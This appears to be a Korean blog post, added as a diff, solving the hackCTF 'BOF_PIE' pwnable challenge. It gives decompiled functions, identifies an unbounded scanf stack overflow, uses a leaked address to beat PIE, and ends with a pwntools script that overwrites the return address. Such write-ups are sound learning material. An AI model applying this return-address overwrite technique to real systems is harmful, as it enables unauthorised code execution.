@@ -1,0 +1,88 @@
+---
+layout: post
+title:  "[hackCTF]BOF_PIE"
+date:   2020-02-18
+---
+
+hackCTF pwnable 9번째 문제
+
+![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)
+
+## ida - main
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  welcome();
+  puts("Nah...");
+  return 0;
+}
+```
+
+## ida - welcome
+```c
+int welcome()
+{
+  char v1; // [esp+6h] [ebp-12h]
+
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  puts("Hello, Do you know j0n9hyun?");
+  printf("j0n9hyun is %p\n", welcome);
+  return _isoc99_scanf("%s", &v1);
+}
+```
+
+## ida - j0n9hyun
+```c
+void j0n9hyun()
+{
+  char s; // [esp+4h] [ebp-34h]
+  FILE * stream; // [esp+2Ch] [ebp-Ch]
+
+  puts("ha-wi");
+  stream = fopen("flag", "r");
+  if ( stream )
+  {
+    fgets(&s, 40, stream);
+    fclose(stream);
+    puts(&s); // flag 출력
+  }
+  else
+  {
+    perror("flag");
+  }
+}
+```
+welcome함수에서 scanf가 v1에 저장할 때 ret을 덮으면 될 것 같다.<br><br>
+![0901](https://drive.google.com/uc?id=1ZwKH2ER8FIFKTDodoJn65xziNKzyQNkg)  
+PIE가 걸려 있고 welcome 함수의 주소를 제공하므로 j0n9hyun 함수의 정확한 주소는 "welcome 함수의 주소 + (j0n9hyun offset - welcome offset)"을 통해 구하자.  
+<br>
+
+정리해보자.<br><br>
+목표 : welcome 함수의 ret을 덮어 j0n9hyun 함수 실행시키기<br>
+취약점 : _isoc99_scanf("%s", &v1)<br><br><br>
+
+***
+
+## exploit.py
+```python
+#!/usr/bin/python
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3008)
+
+p.recvuntil("j0n9hyun is ")
+
+welcome = int(p.recv(10), 16)
+
+offset = 0x890-0x909
+
+payload = "A"*0x16+p32(welcome+offset)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+## 결과
+![0902](https://drive.google.com/uc?id=1P157mVwwxZkmBAeBM12fMtY27HRuqBN6)
